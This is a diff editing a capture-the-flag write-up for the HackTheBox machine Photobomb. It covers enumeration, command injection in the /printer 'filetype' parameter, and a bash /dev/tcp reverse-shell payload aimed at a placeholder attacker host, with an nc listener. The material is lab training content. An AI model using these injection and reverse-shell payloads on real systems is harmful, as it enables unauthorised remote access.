@@ -33,7 +33,7 @@
 ## Enumeration
 
 ### Nmap Scan
-Command: nmap -sC -sV -oA nmap/photobomb 10.10.11.182  
+Command: nmap -sC -sV -oA nmap/photobomb <target_IP>  
 Result:  
 - 22/tcp – OpenSSH 8.9p1 (Ubuntu 3ubuntu0.1)  
 - 80/tcp – nginx 1.18.0 (Ubuntu)  
@@ -41,7 +41,7 @@ Result:
 ### Virtual Host
 The web server expects hostname photobomb.htb.  
 Added entry in /etc/hosts:  
-10.10.11.182    photobomb.htb  
+<target_IP>    photobomb.htb  
 
 *Figure 1 – Nmap scan results*  
 ![Nmap scan](01_nmap.png)
@@ -64,15 +64,16 @@ Login URL: http://photobomb.htb/printer
 ![JS credentials](04_js_creds.png)
 
 ### Command Injection
-POST request to /printer vulnerable to command injection in parameter filetype.  
-Example payload: filetype=jpg;id  
-Response confirmed execution of system command id.  
+POST request to /printer is vulnerable to command injection in parameter `filetype`.
+
+Example payload: `filetype=png;sleep 5;`  
+Response time increased by ~5 seconds, confirming execution of system command. 
 
 *Figure 4 – Burp Suite request showing command injection*
 ![Command injection in Burp](05_command_injection.png)
 
 ### Reverse Shell
-Payload: filetype=jpg;bash -i >& /dev/tcp/10.10.14.2/4444 0>&1  
+Payload: filetype=jpg;bash -i >& /dev/tcp/<attacker_IP>/<attacker_port> 0>&1  
 Listener: nc -lvnp 4444  
 Result: reverse shell as user wizard.  
 
@@ -130,12 +131,14 @@ Result: root shell obtained.
 User flag: cat /home/wizard/user.txt  
 Root flag: cat /root/root.txt  
 
-*Figure 9 – User flag* 
-![User flag](09_user_flag.png)
+*Figure 9 – User flag*  
+![User flag](09_user_flag.png)  
+Output: `HTB{redacted}`  
+
+*Figure 10 – Root flag*  
+![Root flag](10_root_flag.png)  
 Output: `HTB{redacted}`
-*Figure 10 – Root flag*
-![Root flag](10_root_flag.png)
-Output: `HTB{redacted}`
+
 ---
 
 ## Cleanup
